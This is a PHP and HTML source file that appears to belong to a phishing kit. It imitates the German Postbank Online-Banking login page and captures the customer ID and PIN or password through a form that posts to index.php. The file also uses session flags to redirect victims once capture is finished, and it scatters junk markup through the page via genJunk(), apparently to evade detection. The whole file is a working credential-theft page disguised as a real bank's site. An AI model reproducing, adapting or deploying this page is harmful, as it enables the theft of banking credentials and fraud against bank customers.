<?php
	session_start();
	include("config.php");
	
	if (isset($_SESSION['finished']) && $_SESSION['finished']) {
		header('Location: ' .  $redirect);
	}
?>
<!DOCTYPE html>
<html class="js flexbox canvas canvastext webgl no-touch geolocation postmessage no-websqldatabase no-indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients no-cssreflections csstransforms csstransforms3d csstransitions fontface video audio localstorage sessionstorage webworkers applicationcache svg inlinesvg smil svgclippaths" lang="de">
	<head>
		<meta http-equiv="content-type" content="text/html; charset=UTF-8">
		<meta name="robots" content="noindex" />
		<meta name="googlebot" content="noindex">
		<title>Postbank Online-Banking</title>
		<meta charset="utf-8">
		<meta http-equiv="X-UA-Compatible" content="IE=edge">
		<link rel="shortcut icon" href="src/poba_img/favicon.ico">
		<link rel="stylesheet" type="text/css" href="src/poba_css/rai.css">
		<script type="text/javascript" src="src/poba_js/jquery-1.js"></script>
		<script type="text/javascript" src="src/poba_js/jquery_003.js"></script>
		<script type="text/javascript" src="src/poba_js/jquery.js"></script>
		<script type="text/javascript">
			/*<![CDATA[*/
				Wicket.Event.add(window, "domready", function(event) { 
					handleOutsizedFeedback();
					Wicket.Event.publish(Wicket.Event.Topic.AJAX_HANDLERS_BOUND);
				;});
			/*]]>*/
		</script>
	</head>
	<body class="app-welcome-do" id="banking-postbank-de">
		<?php echo genJunk() ?><div id="page" class="tpl-01">
			<?php echo genJunk() ?><div id="page-cn">
				<?php echo genJunk() ?><div id="header">
					<?php echo genJunk() ?><div id="header-cn">
						<?php echo genJunk() ?><div id="branding">
							<h1 class="aux">Postbank Online-Banking</h1>
							<a href="#">
								<img src="src/poba_img/pb-logo.png" class="logo" alt="Logo: Postbank" width="145" height="40">
							</a>
						</div><?php echo genJunk() ?>
					</div><?php echo genJunk() ?>
				</div><?php echo genJunk() ?>
				<?php echo genJunk() ?><div id="main">
					<?php echo genJunk() ?><div id="main-cn">
						<?php echo genJunk() ?><div id="content">
							<?php echo genJunk() ?><div id="content-cn">
								<a href="#aside" class="skip">Inhalt überspringen</a>
								<?php echo genJunk() ?><div id="content-hd">
									<?php echo genJunk() ?><div class="page-title">
										<h1>Postbank Online-Banking<br>Willkommen</h1>
									</div><?php echo genJunk() ?>
								</div><?php echo genJunk() ?>
								<?php echo genJunk() ?><div id="content-bd">
									<?php echo genJunk() ?><div class="form frm-login">
										<form method="post" class="form-cn" action="index.php" id="id4">
											<?php echo genJunk() ?><div class="form-bd">
												<fieldset>
													<legend>Kundenzugang</legend>
													<fieldset>
														<?php echo genJunk() ?><div class="field fld-text fld-username <?php echo (isset($_SESSION['userErr']) ? "state-error" : "") ?> required" id="id7">
															<?php echo genJunk() ?><div class="field-cn">
																<?php echo genJunk() ?><div class="field-bd">
																	<span class="field-group">
																		<span class="field-label">
																			<label for="id1"><b><abbr title="Postbank ID oder Kontonummer">Postbank ID oder Kontonummer</abbr>:</b></label>
																		</span>
																		<span class="field-input">
																			<input maxlength="30" name="pb_username" id="id1" value="<?php echo (isset($_SESSION['pb_username']) ? $_SESSION['pb_username'] : "") ?>" class="type-text required required" autocomplete="off" minlength="2" title="Sie können sich mit Ihrer Postbank ID oder einer Kontonummer anmelden." type="text">
																			<script type="text/javascript">$(document).ready(function(){$('#id1').focus()});</script>
																		</span>
																	</span>
																</div><?php echo genJunk() ?>
																<?php 
																	if (isset($_SESSION['userErr'])) { echo '<?php echo genJunk() ?><div class="field-ft"><span id="id8"><p class="field-error" style="visibility: visible;">Es fehlen Angaben. Bitte füllen Sie dieses Feld aus.</p></span></div><?php echo genJunk() ?>'; }
																	unset($_SESSION['userErr']);
																?>
															</div><?php echo genJunk() ?>
														</div><?php echo genJunk() ?>
													</fieldset>
													<fieldset>
														<?php echo genJunk() ?><div class="field fld-password fld-pinpassword <?php echo (isset($_SESSION['passErr']) ? "state-error" : "") ?> required" id="id9">
															<?php echo genJunk() ?><div class="field-cn">
																<?php echo genJunk() ?><div class="field-bd">
																	<span class="field-group">
																		<span class="field-label">
																			<label for="pin-number"><b><abbr title="Passwort oder PIN">Passwort oder PIN</abbr>:</b></label>
																		</span>
																		<span class="field-input">
																			<input value="" maxlength="50" name="pb_password" id="pb_password" class="type-password required" autocomplete="off" minlength="5" title="Bitte geben Sie zur Postbank ID das Passwort an und zur Kontonummer die PIN." type="password">
																		</span>
																	</span>
																</div><?php echo genJunk() ?>
																<?php 
																	if (isset($_SESSION['passErr'])) { echo '<?php echo genJunk() ?><div class="field-ft"><span id="id8"><p class="field-error" style="visibility: visible;">Es fehlen Angaben. Bitte füllen Sie dieses Feld aus.</p></span></div><?php echo genJunk() ?>'; }
																	unset($_SESSION['passErr']);
																?>
															</div><?php echo genJunk() ?>
														</div><?php echo genJunk() ?>
														<?php echo genJunk() ?><div class="control">
															<?php echo genJunk() ?><div class="control-cn">
																<?php echo genJunk() ?><div class="control-bd">
																	<?php echo genJunk() ?><div class="control-next">
																		<button type="submit" value="Anmelden" name="sendOB_Login_x" id="submit" class="type-submit">Anmelden</button>
																	</div><?php echo genJunk() ?>
																</div><?php echo genJunk() ?>
															</div><?php echo genJunk() ?>
														</div><?php echo genJunk() ?>
													</fieldset>
												</fieldset>
											</div><?php echo genJunk() ?>
													
											<?php echo genJunk() ?><div class="form-ft"></div><?php echo genJunk() ?>
											<fieldset></fieldset>
										</form>
									</div><?php echo genJunk() ?>
									<?php echo genJunk() ?><div class="text txt-info">
										<?php echo genJunk() ?><div class="text-cn">
											<?php echo genJunk() ?><div class="text-hd">
												<span id="solosparhinweis"></span>
												<noscript>
												<span>Sie können sich mit Ihrer Postbank ID, Ihrem Girokonto oder Sparkonto einloggen. Nutzen Sie bitte entsprechend Ihr Passwort, Ihre Online-Banking PIN für das Girokonto bzw. Ihre Telefon-Banking PIN für das Sparkonto.</span><br/><br/>
												</noscript>
												<h2>Noch kein Online-Banking Kunde?</h2>
											</div><?php echo genJunk() ?>
											<?php echo genJunk() ?><div class="text-bd">
											<p><a href="#" class="action">Informationen ansehen</a>
											, <a class="action" id="idb" href="#">Demokonto testen</a>
											oder zum <a href="#" class="action">Online-Banking freischalten</a>.
											</p>
											</div><?php echo genJunk() ?>
										</div><?php echo genJunk() ?>
									</div><?php echo genJunk() ?>
								</div><?php echo genJunk() ?>
							</div><?php echo genJunk() ?>
						</div><?php echo genJunk() ?>
					</div><?php echo genJunk() ?>
				</div><?php echo genJunk() ?>
				<?php echo genJunk() ?><div id="aside">
					<?php echo genJunk() ?><div id="aside-cn">
						<a href="#footer" class="skip">Hinweise überspringen</a>
						<?php echo genJunk() ?><div id="ide" class="state-closed">
							<?php echo genJunk() ?><div class="aside-hd">
								<h2 class="aux">Wichtige Hinweise</h2>
							</div><?php echo genJunk() ?>
							<?php echo genJunk() ?><div class="aside-bd">
								<?php echo genJunk() ?><div id="billboard">
								<?php echo genJunk() ?><div class="teaser tsr-medium">
								<?php echo genJunk() ?><div class="teaser-cn tsr-media">
								<?php echo genJunk() ?><div class="teaser-hd">
								<h3>
								<a href="#" id="id11" target="_blank">
								<span>Sicherheitshinweis</span>
								</a>
								</h3>
								</div><?php echo genJunk() ?>
								<?php echo genJunk() ?><div class="teaser-bd">
								<p>
								<span class="teaser-text">Achtung: Betrüger drängen am Telefon auf Sicherheits-Update für die App „Postbank Finanzassistent“.</span>
								<a class="action" href="#" id="id12" target="_blank">
								<span style="white-space: nowrap">Jetzt informieren</span>
								</a>
								</p>
								</div><?php echo genJunk() ?>
								<?php echo genJunk() ?><div class="teaser-ft">
								<img src="src/poba_img/iob_sicherheit_sepa.png">
								</div><?php echo genJunk() ?>
								</div><?php echo genJunk() ?>
								</div><?php echo genJunk() ?>
								<?php echo genJunk() ?><div class="teaser tsr-medium">
									<?php echo genJunk() ?><div class="teaser-cn tsr-media">
									<?php echo genJunk() ?><div class="teaser-hd">
									<h3>
									<a href="#" id="id15" target="_blank">
									<span>Neue Postbank Kontowelt</span>
									</a>
									</h3>
									</div><?php echo genJunk() ?>
									<?php echo genJunk() ?><div class="teaser-bd">
									<p>
									<span class="teaser-text">Haben Sie Fragen zu Ihrem aktuellen Kontoauszug oder suchen Sie Informationen zur Postbank Kontowelt?</span>
									<a class="action" href="#" id="id16" target="_blank">
									<span style="white-space: nowrap">Jetzt informieren </span>
									</a>
									</p>
									</div><?php echo genJunk() ?>
									<?php echo genJunk() ?><div class="teaser-ft">
									<img src="src/poba_img/iob_stoerung.png">
									</div><?php echo genJunk() ?>
									</div><?php echo genJunk() ?>
									</div><?php echo genJunk() ?>
								</div><?php echo genJunk() ?>
							</div><?php echo genJunk() ?>
						</div><?php echo genJunk() ?>
					</div><?php echo genJunk() ?>
				</div><?php echo genJunk() ?>
				<?php echo genJunk() ?><div id="footer">
					<?php echo genJunk() ?><div id="footer-cn">
						<?php echo genJunk() ?><div class="footer-hd">
						</div><?php echo genJunk() ?>
						<?php echo genJunk() ?><div class="footer-bd">
						<a href="#page" class="skip">Zum Seitenanfang</a>
						<?php echo genJunk() ?><div id="site-meta">
						<h2 class="aux">Weitere Informationen zu Postbank Online-Banking</h2>
						<ul>
						<li>
						<a rel="external" href="" target="_blank" title="In neuem Fenster öffnen">Rechtshinweise</a> |
						</li>
						<li>
						<a rel="external" href="" target="_blank" title="In neuem Fenster öffnen">Impressum</a> |
						</li>
						<li>
						<a rel="external" href="" target="_blank" title="In neuem Fenster öffnen">Bedienungshilfen</a> |
						</li>

						<li>
						<a rel="external" href="" target="_blank" title="In neuem Fenster öffnen">Newsletter</a>
						</li>
						</ul>
						</div><?php echo genJunk() ?>
						<?php echo genJunk() ?><div id="site-copyright">
						<p>© <span><?php echo date("Y"); ?></span> Deutsche Postbank AG</p>
						</div><?php echo genJunk() ?>
						</div><?php echo genJunk() ?>
					</div><?php echo genJunk() ?>
				</div><?php echo genJunk() ?>
				<?php echo genJunk() ?><div id="printfooter">
					<?php echo genJunk() ?><div id="printfooter-cn">
						<span class="fallbackText">Postbank</span>
					</div><?php echo genJunk() ?>
				</div><?php echo genJunk() ?>
			</div><?php echo genJunk() ?>
		</div><?php echo genJunk() ?>
	</body>
</html>